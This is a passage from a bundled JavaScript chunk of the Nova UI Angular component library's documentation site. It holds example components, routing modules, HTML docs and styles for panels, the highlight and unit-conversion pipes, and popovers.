{\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "collapsible",\n        component: PanelCollapseExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "hidden",\n        component: PanelHideExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "floating",\n        component: PanelFloatExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "resize",\n        component: PanelResizeExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiPanelModule,\n        NuiDocsModule,\n        NuiMenuModule,\n        NuiSwitchModule,\n        NuiIconModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        PanelBasicExampleComponent,\n        PanelCollapseExampleComponent,\n        PanelCollapseOutsideControlExampleComponent,\n        PanelSizeExampleComponent,\n        PanelEmbeddedContentExampleComponent,\n        PanelHoverableExampleComponent,\n        PanelCustomStylesExampleComponent,\n        PanelDocsExampleComponent,\n        PanelFloatExampleComponent,\n        PanelHideExampleComponent,\n        PanelHideOutsideControlExampleComponent,\n        PanelNestedExampleComponent,\n        PanelPositionExampleComponent,\n        PanelResizeExampleComponent,\n        PanelCollapseTopOrientedExampleComponent,\n        PanelVisualTestComponent,\n        PanelTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("panel"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class PanelModule {}\n'},1525:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The\n    <code\n        ><a href="../pipes/HighlightPipe.html#info" target="_parent"\n            >nuiHighlight</a\n        ></code\n    >\n    pipe is used to mark a portion of text. It will search the provided text for\n    the specified string and highlight it.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiCommonModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    This pipe can only be used with the <code>innerHTML</code> attribute. It\n    escapes all the characters by default, and highlights every match in the\n    string.\n</p>\n<nui-example-wrapper filenamePrefix="highlight-pipe" exampleTitle="Basic Usage">\n    <nui-demo-highlight-pipe></nui-demo-highlight-pipe>\n</nui-example-wrapper>\n'},10193:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-pipes-docs-example",\n    templateUrl: "./highlight-pipe-docs.example.component.html",\n})\nexport class HighlightPipeDocsExampleComponent {}\n'},8813:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiCommonModule,\n    NuiDocsModule,\n    NuiSearchModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { HighlightPipeExampleComponent } from "./highlight-pipe/highlight-pipe.example.component";\nimport { HighlightPipeDocsExampleComponent } from "./highlight-pipe-docs/highlight-pipe-docs.example.component";\n\nconst routes = [\n    {\n        path: "",\n        component: HighlightPipeDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "highlight-pipe",\n        component: HighlightPipeExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n];\n\n@NgModule({\n    declarations: [\n        HighlightPipeDocsExampleComponent,\n        HighlightPipeExampleComponent,\n    ],\n    imports: [\n        NuiCommonModule,\n        NuiDocsModule,\n        NuiSearchModule,\n        RouterModule.forChild(routes),\n    ],\n    exports: [RouterModule],\n})\nexport class HighlightPipeExampleModule {}\n'},10433:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h3>Highlighting a portion of text:</h3>\n<p [innerHTML]="\'hello world\' | nuiHighlight : \'world\'"></p>\n\n<h3>Dynamic highlighting (for example, with search):</h3>\n<nui-search\n    (inputChange)="changeSearchValue($event)"\n    [value]="term"\n></nui-search>\n<p [innerHTML]="searchString | nuiHighlight : term"></p>\n'},71213:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-demo-highlight-pipe",\n    templateUrl: "./highlight-pipe.example.component.html",\n})\nexport class HighlightPipeExampleComponent {\n    term: string = "bar";\n    searchString: string = `hello <span class="x">FOO</span> bar`;\n\n    changeSearchValue(value: string): void {\n        this.term = value;\n    }\n}\n'},25423:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport { DEMO_PATH_TOKEN, NuiDocsModule } from "@nova-ui/bits";\n\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "highlight",\n        loadChildren: async () =>\n            import("./highlight/highlight-pipe-example.module").then(\n                (m) => m.HighlightPipeExampleModule\n            ),\n    },\n    {\n        path: "unit-conversion",\n        loadChildren: async () =>\n            import(\n                "./unit-conversion/unit-conversion-pipe-example.module"\n            ).then((m) => m.UnitConversionPipeExampleModule),\n    },\n];\n\n@NgModule({\n    imports: [NuiDocsModule, RouterModule.forChild(routes)],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("pipes"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class PipesModule {}\n'},46425:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The\n    <code\n        ><a href="../pipes/UnitConversionPipe.html#info" target="_parent"\n            >unitConversion</a\n        ></code\n    >\n    pipe can be used to convert a large value of a small basic unit to a smaller\n    value of a larger unit--for example, converting a quantity of 1024 in bytes\n    to "1 KB". The converted unit label is automatically appended to the output.\n    Supported units are of type\n    <code\n        ><a href="../miscellaneous/typealiases.html#UnitOption" target="_blank"\n            >UnitOption</a\n        ></code\n    >\n    and include the following: <code>"generic"</code> (e.g. 1K for 1000),\n    <code>"bytes"</code>, <code>"bytesPerSecond"</code>,\n    <code>"bitsPerSecond"</code>, and <code>"hertz"</code>.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    Under the hood, this pipe uses the\n    <code\n        ><a href="../injectables/UnitConversionService.html" target="_blank"\n            >UnitConversionService</a\n        ></code\n    >. If the pipe doesn\'t offer something you need, such as separating the\n    value and unit out into separate outputs or converting a value outside the\n    context of a template, using the service directly may be a better option for\n    you.\n</nui-message>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiCommonModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To get started with using the pipe, take a look at the template source of\n    the example below.\n</p>\n\n<h3>Parameters</h3>\n<p>The pipe accepts the following parameters:</p>\n<ul>\n    <li><strong>value</strong> - The value to be converted.</li>\n    <li>\n        <strong>scale</strong> - The decimal scale of the formatted value for\n        specifying how many significant digits to display to the right of the\n        decimal. Defaults to <code>0</code>.\n    </li>\n    <li>\n        <strong>plusSign</strong> - Boolean for specifying whether to prefix the\n        output with a \'+\' when the source value is greater than zero. Defaults\n        to false.\n    </li>\n    <li>\n        <strong>unit</strong> - The basic unit to use for the conversion.\n        Accepts arguments of type\n        <code\n            ><a\n                href="../miscellaneous/typealiases.html#UnitOption"\n                target="_blank"\n                >UnitOption</a\n            ></code\n        >. Defaults to <code>"bytes"</code>.\n    </li>\n</ul>\n<nui-message type="info" [allowDismiss]="false">\n    The pipe will localize the output for all supported units except the\n    "generic" unit. Localization for the "generic" unit is not yet supported.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="unit-conversion-pipe-basic"\n    exampleTitle="Basic Usage"\n>\n    <unit-conversion-pipe-basic-example></unit-conversion-pipe-basic-example>\n</nui-example-wrapper>\n'},63685:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="ul {\n    padding-left: 40px;\n\n    li {\n        list-style: disc;\n    }\n}\n"},28277:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    templateUrl: "./unit-conversion-pipe-docs.component.html",\n    styleUrls: ["./unit-conversion-pipe-docs.component.less"],\n})\nexport class UnitConversionPipeDocsComponent {}\n'},15093:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="conversion d-flex flex-column align-items-end">\n    {{ num | unitConversion : 2 : false : "bitsPerSecond" }}\n</div>\n<hr />\n<nui-form-field\n    class="d-block mt-5"\n    caption="Bits Per Second"\n    i18n-caption\n    [showOptionalText]="false"\n>\n    <nui-textbox-number\n        type="number"\n        [(ngModel)]="num"\n        [minValue]="0"\n        [step]="10"\n        customBoxWidth="200px"\n    ></nui-textbox-number>\n</nui-form-field>\n'},83753:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".conversion {\n    font-size: 25px;\n    width: 160px;\n}\n"},70609:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "unit-conversion-pipe-basic-example",\n    templateUrl: "./unit-conversion-pipe-basic.example.component.html",\n    styleUrls: ["./unit-conversion-pipe-basic.example.component.less"],\n})\nexport class UnitConversionPipeBasicExampleComponent {\n    public num = 998990;\n}\n'},80609:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiCommonModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiMessageModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { UnitConversionPipeDocsComponent } from "./docs/unit-conversion-pipe-docs.component";\nimport { UnitConversionPipeBasicExampleComponent } from "./unit-conversion-basic/unit-conversion-pipe-basic.example.component";\n\nconst routes = [\n    {\n        path: "",\n        component: UnitConversionPipeDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "basic",\n        component: UnitConversionPipeBasicExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    declarations: [\n        UnitConversionPipeDocsComponent,\n        UnitConversionPipeBasicExampleComponent,\n    ],\n    imports: [\n        FormsModule,\n        NuiCommonModule,\n        NuiDocsModule,\n        NuiFormFieldModule,\n        NuiMessageModule,\n        NuiTextboxModule,\n        RouterModule.forChild(routes),\n    ],\n    exports: [RouterModule],\n})\nexport class UnitConversionPipeExampleModule {}\n'},496:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./popover-docs/popover-docs.example.component";\nexport * from "./popover-disabled/popover-disabled.example.component";\nexport * from "./popover-basic-usage/popover-basic-usage.example.component";\nexport * from "./popover-no-padding/popover-no-padding.example.component";\nexport * from "./popover-with-title/popover-with-title.example.component";\nexport * from "./popover-with-container/popover-with-container.example.component";\nexport * from "./popover-click-trigger/popover-click-trigger.example.component";\nexport * from "./popover-focus-trigger/popover-focus-trigger.example.component";\nexport * from "./popover-mouseenter-trigger/popover-mouseenter-trigger.example.component";\nexport * from "./popover-icon/popover-icon.example.component";\nexport * from "./popover-modal/popover-modal.example.component";\nexport * from "./popover-placement/popover-placement.example.component";\nexport * from "./popover-prevent-close-on-click/popover-prevent-close-on-click.example.component";\nexport * from "./popover-outputs/popover-outputs.example.component";\nexport * from "./popover-visual-test/popover-visual-test.component";\nexport * from "./popover-unlimited/popover-unlimited.example.component";\nexport * from "./popover-open-and-close-programmatically/popover-open-and-close-programmatically.example.component";\nexport * from "./popover-status/popover-status.example.component";\nexport * from "./popover-debounce/popover-debounce.example.component";\n'},60262:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover [template]="popoverWithBasicUsage" i18n>\n    Hover over me!\n</nui-popover>\n\n<ng-template #popoverWithBasicUsage i18n>\n    I\'m implemented with the simplest usage! Expand my source code above to see\n    how!\n</ng-template>\n'},12562:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-basic-usage-example",\n    templateUrl: "./popover-basic-usage.example.component.html",\n})\nexport class PopoverBasicUsageExampleComponent {}\n'},23342:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    popoverTitle="Popover with Click Trigger"\n    i18n-popoverTitle\n    id="nui-demo-popover-onclick"\n    trigger="click"\n    [template]="popoverWithClickTrigger"\n>\n    <span i18n>Click me!</span>\n</nui-popover>\n\n<ng-template #popoverWithClickTrigger>\n    <div id="nui-demo-popover-modal-click" i18n>Hi, I\'m clicked!</div>\n</ng-template>\n'},73034:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-click-trigger-example",\n    templateUrl: "./popover-click-trigger.example.component.html",\n})\nexport class PopoverClickTriggerExampleComponent {}\n'},12678:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <nui-popover\n        id="nui-demo-popover-debounce-1"\n        [template]="popoverDebounce1st"\n        [delay]="1000"\n        i18n\n        >Hover over me 1st!</nui-popover\n    >\n</p>\n<p>\n    <nui-popover [template]="popoverDebounce2nd" [delay]="1000" i18n\n        >Hover over me 2nd!</nui-popover\n    >\n</p>\n<p>\n    <nui-popover [template]="popoverDebounce3rd" [delay]="1000" i18n\n        >Hover over me 3rd!</nui-popover\n    >\n</p>\n\n<ng-template #popoverDebounce1st i18n>\n    <span id="nui-demo-popover-modal-debounce-1"\n        >I\'m the 1st implementation with the debounce!</span\n    >\n</ng-template>\n\n<ng-template #popoverDebounce2nd i18n>\n    I\'m the 2nd implementation with the debounce!\n</ng-template>\n\n<ng-template #popoverDebounce3rd i18n>\n    I\'m the 3rd implementation with the debounce!\n</ng-template>\n'},42661:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-debounce-example",\n    templateUrl: "./popover-debounce.example.component.html",\n})\nexport class PopoverDebounceExampleComponent {}\n'},37619:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    popoverTitle="Disabled Popover"\n    i18n-popoverTitle\n    id="nui-demo-popover-disabled"\n    trigger="click"\n    [disabled]="disabled"\n    [template]="popoverDisabled"\n>\n    <button nui-button type="button">\n        <span i18n>Click me!</span>\n    </button>\n</nui-popover>\n\n<div class="mt-2">\n    <button\n        id="nui-disable-popover-toggle"\n        nui-button\n        type="button"\n        (click)="changeStatus()"\n    >\n        {{ buttonName }}\n    </button>\n</div>\n<ng-template #popoverDisabled>\n    <div id="nui-demo-popover-modal-disabled" i18n>\n        Hi, I\'m clicked after being enabled!\n    </div>\n</ng-template>\n'},67424:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-disabled-example",\n    templateUrl: "./popover-disabled.example.component.html",\n})\nexport class PopoverDisabledExampleComponent {\n    public disabled = false;\n    public buttonName = $localize`Disable`;\n\n    constructor() {}\n\n    changeStatus(): void {\n        this.disabled = !this.disabled;\n        this.buttonName = this.disabled\n            ? $localize`Enable`\n            : $localize`Disable`;\n    }\n}\n'},30266:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-popover&gt;</code> is a popup control that can contain any\n    HTML markup and be applied to block or in-line elements. It can basically be\n    thought of as a more data-rich tooltip.\n</p>\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiPopoverModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    A simple popover can be added to the page by adding an\n    